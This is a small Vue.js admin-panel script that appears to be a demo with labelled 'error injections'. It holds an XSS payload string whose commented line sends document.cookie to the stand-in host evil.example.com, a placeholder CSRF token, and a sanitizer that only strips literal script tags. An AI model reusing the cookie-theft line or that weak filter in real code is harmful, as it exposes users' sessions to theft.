// admin.js

import { createApp } from 'vue';
import App from './App.vue';
import axios from 'axios';

const app = createApp(App);

// Simulate server-supplied data (replace with actual server data)
const serverData = {
  adminUserId: "AWESOME_USER_123",
  userRole: "administrator",
  warningMessage: "Be careful with this data."
};

// Error Injection 1: XSS
// Simulate injecting JavaScript code into a vulnerable input field.
// This is a simplified example; a real application would require
// more robust sanitization.
const evilScript = `<script>
  console.log("Evil code injected!");
  // Example: Steal a cookie (very simplified)
  // window.location.href = "https://evil.example.com/?cookie=" + document.cookie;
</script>`;

// Error Injection 2: CSRF
const csrfToken = "YOUR_CSRF_TOKEN"; // Replace with actual CSRF token

// Function to fetch data from the server
async function fetchData() {
    try {
        const response = await axios.get('/api/admin/data', {
            headers: {
                'CSRF-TOKEN': csrfToken
            }
        });
        console.log("Data from server:", response.data);
        // Update the UI with the data
    } catch (error) {
        console.error("Error fetching data:", error);
    }
}

// Simulate admin UI elements and actions
app.mount('#admin');

// Example: Button click to fetch data
document.getElementById('fetch-data-button').addEventListener('click', fetchData);

// Display some data
document.getElementById('admin-user-id').textContent = serverData.adminUserId;
document.getElementById('admin-warning-message').textContent = serverData.warningMessage;

// Simulated data refresh (for demonstration purposes)
setInterval(fetchData, 5000); // Refresh every 5 seconds

// Example of XSS mitigation - Sanitization (Basic)
const inputElement = document.getElementById('admin-input-field');
if (inputElement) {
  inputElement.addEventListener('input', (event) => {
    const sanitizedText = event.target.value.replace(/<script>/gi, '');  //Remove script tags
    inputElement.value = sanitizedText;
  });
}